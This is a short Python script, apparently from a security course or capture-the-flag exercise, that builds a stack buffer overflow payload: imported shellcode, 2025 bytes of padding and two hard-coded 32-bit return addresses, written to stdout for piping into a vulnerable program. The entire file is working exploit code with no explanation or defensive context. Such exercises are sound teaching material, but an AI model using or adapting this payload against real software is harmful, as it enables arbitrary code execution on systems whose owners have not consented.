import struct
import sys
from struct import pack
from shellcode import shellcode

s="a"*2025
sys.stdout.buffer.write(shellcode+s.encode()+pack("<I",0xbffe6878)+pack("<I",0xbffe708c))
